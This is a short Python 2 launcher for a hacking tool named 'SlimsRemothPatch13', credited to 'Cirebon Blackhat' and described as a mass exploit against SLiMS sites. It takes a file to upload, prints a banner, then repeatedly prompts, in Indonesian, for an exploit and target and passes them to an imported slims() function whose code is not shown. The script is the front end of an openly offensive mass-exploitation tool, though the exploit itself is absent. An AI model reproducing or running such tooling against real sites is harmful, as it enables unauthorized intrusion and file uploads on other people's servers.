from src.SlimService import slims
import sys,os

def param_check():
	try:
		a = sys.argv[1]
	except IndexError:
		print("Usage python2 slim.py file.txt")
		os.sys.exit()

def file_check():
	try:
		open(sys.argv[1])
	except IOError:
		print("Pastikan file yang mau di upload benar")
		os.sys.exit()

def about():
	os.system("clear")
	print('\033[1;31m\n=================================================\nTools : \033[1;37mSlimsRemothPatch13 ')
	print('\033[1;31mProf Concept : \033[1;37mMass Xploit & Reverse Domain Slims')
	print('\033[1;31mThanks To : \033[1;37mCirebon Blackhat\n=================================================')


if __name__ == "__main__":
	try:
		about()
		param_check()
		file_check()
		while True:
			target = raw_input("\033[1;37m[ \033[1;31mMasukan Exploit Dan Target Disini Om \033[1;37m] :\n ")
			a = slims(target, sys.argv[1])
	except:
		pass
